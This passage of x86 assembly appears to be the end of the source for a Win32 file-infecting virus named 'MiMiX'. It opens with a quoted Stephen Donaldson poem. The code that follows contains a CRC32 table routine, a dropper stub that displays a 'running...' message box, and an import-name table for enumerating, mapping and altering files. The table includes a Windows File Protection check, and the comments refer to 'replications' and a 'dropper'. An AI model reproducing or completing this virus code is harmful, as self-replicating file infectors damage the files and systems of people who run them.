           ;I hold the bone-sap of myself,
           ;  And watch the marrow burn.
           ;
           ;When last comes to last,
           ;  I have little strength:
           ;  I am only a tool.
           ;I work its work; and in its hands
           ;  I am the fool.
           ;
           ;When last comes to last,
           ;  I have little life.
           ;  I am simply a deed:
           ;an action done while courage holds:
           ;  A seed.
           ;(Stephen Donaldson)

   mimix_codeend   label   near
   mimix_inf       endp

   create_crcs     proc    near
           or      eax, -1

   create_outer    label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   create_inner    label   near
           add     eax, eax
           jnb     create_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   create_skip     label   near
           loop    create_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      create_outer
           stos    dword ptr [edi]
           dec     edx
           jne     create_crcs
           ret
   create_crcs     endp

   do_message      label   near
           xor     ebx, ebx
           push    ebx
           push    offset txttitle
           push    offset txtbody
           push    ebx
           call    MessageBoxA
           push    ebx
           call    ExitProcess

   ;must be alphabetical order
   ;API names are not present in replications, only in dropper

   krnnames        db      "CloseHandle"         , 0
                   db      "CreateFileA"         , 0
                   db      "CreateFileMappingA"  , 0
                   db      "CreateFileW"         , 0
                   db      "FindClose"           , 0
                   db      "FindFirstFileA"      , 0
                   db      "FindFirstFileW"      , 0
                   db      "FindNextFileA"       , 0
                   db      "FindNextFileW"       , 0
                   db      "GetFullPathNameA"    , 0
                   db      "GetFullPathNameW"    , 0
                   db      "GetTickCount"        , 0
                   db      "GetVersion"          , 0
                   db      "GlobalAlloc"         , 0
                   db      "GlobalFree"          , 0
                   db      "LoadLibraryA"        , 0
                   db      "MapViewOfFile"       , 0
                   db      "MultiByteToWideChar" , 0
                   db      "SetCurrentDirectoryA", 0
                   db      "SetCurrentDirectoryW", 0
                   db      "SetFileAttributesA"  , 0
                   db      "SetFileAttributesW"  , 0
                   db      "SetFileTime"         , 0
                   db      "UnmapViewOfFile"     , 0

   sfcnames        db      "SfcIsFileProtected", 0

   txttitle        db      "MiMiX", 0
   txtbody         db      "running...", 0

   .code
           nop
   end             dropper
